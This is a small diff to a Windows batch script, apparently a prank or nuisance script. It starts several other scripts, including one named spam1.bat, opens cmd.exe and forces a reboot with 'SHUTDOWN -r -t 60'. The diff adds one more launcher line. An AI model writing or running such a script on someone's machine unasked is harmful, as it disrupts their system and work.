@@ -9,6 +9,7 @@ start l.vbs
 start song.mp3
 start spam1.bat
 start Start2.bat
+start refreshexplorer.bat
 cd C:\Windows\System32
 start cmd.exe
 SHUTDOWN -r -t 60
